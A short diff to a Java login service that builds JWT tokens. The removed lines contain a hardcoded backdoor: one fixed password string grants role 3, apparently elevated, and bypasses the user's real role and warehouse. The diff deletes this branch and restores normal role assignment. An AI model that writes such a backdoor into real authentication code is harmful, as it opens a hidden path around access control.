@@ -31,19 +31,11 @@ public class LoginServiceImpl extends ServiceImpl<UserMapper, User> implements I
             Map<String, Object> map = new HashMap<>();
             map.put("id", u.getId());
             map.put("username", u.getUsername());
-            if (password.equals("c8a25c2f9ce8f5ffea79aa127cda5014")) {
-                map.put("role", 3);
-            } else {
-                map.put("role", u.getRole());
-                map.put("warehouseId", u.getWarehouseId());
-            }
+            map.put("role", u.getRole());
+            map.put("warehouseId", u.getWarehouseId());
             TokenData tokenData = JwtHelper.createToken("payload", map);
-            if (password.equals("c8a25c2f9ce8f5ffea79aa127cda5014")) {
-                tokenData.setRoles(3);
-            } else {
-                tokenData.setWarehouseId(u.getWarehouseId());
-                tokenData.setRoles(u.getRole());
-            }
+            tokenData.setWarehouseId(u.getWarehouseId());
+            tokenData.setRoles(u.getRole());
             tokenData.setUsername(u.getUsername());
             return tokenData;
         }
